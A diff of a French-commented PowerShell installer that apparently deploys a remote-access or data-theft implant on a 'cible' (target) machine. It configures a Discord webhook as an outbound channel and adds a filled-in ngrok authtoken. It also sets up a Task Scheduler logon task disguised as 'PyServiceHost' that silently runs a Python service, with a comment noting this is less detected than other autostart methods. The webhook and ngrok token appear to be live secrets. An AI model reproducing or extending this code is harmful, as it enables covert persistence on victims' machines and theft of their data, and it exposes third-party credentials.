@@ -11,7 +11,7 @@
 
 # ── A MODIFIER AVANT DE PARTAGER ─────────────────────────────────────────────
 $WEBHOOK     = "https://discord.com/api/webhooks/1514603803637448836/OPmaAXfgSFSFAHwUyjTjoTZbc8fYiMaxN3xP8SAIlApaEDFFe-tq2IM6I2t_y0d5B7R2"
-$NGROK_TOKEN = "VOTRE_NGROK_AUTHTOKEN_ICI"
+$NGROK_TOKEN = "3EzQoIUY30XZNJ5yHFFLhDuX678_3FwcieXQBpdcur2R38tQw"
 # ─────────────────────────────────────────────────────────────────────────────
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -165,8 +165,18 @@ $cfgJson = ([ordered]@{
 
 # ── Demarrage automatique via Task Scheduler (moins detecte que VBS/Startup) ──
 $taskName = "PyServiceHost"
-$pw       = Get-Command pythonw.exe -ErrorAction SilentlyContinue
-$pythonw  = if ($pw) { $pw.Source } else { "pythonw.exe" }
+$pythonw  = @(
+    "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe",
+    "$env:LOCALAPPDATA\Programs\Python\Python312\pythonw.exe",
+    "$env:LOCALAPPDATA\Programs\Python\Python310\pythonw.exe",
+    "$env:LOCALAPPDATA\Programs\Python\Python39\pythonw.exe",
+    "C:\Python311\pythonw.exe",
+    "C:\Python312\pythonw.exe"
+) | Where-Object { Test-Path $_ } | Select-Object -First 1
+if (-not $pythonw) {
+    $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
+    $pythonw = if ($cmd) { $cmd.Source } else { "pythonw.exe" }
+}
 schtasks /create /tn $taskName /tr "`"$pythonw`" `"$INSTALL_DIR\svc.py`"" /sc onlogon /f /rl limited 2>$null
 
 # ── uninstall.ps1 (depose sur la cible) ──────────────────────────────────────
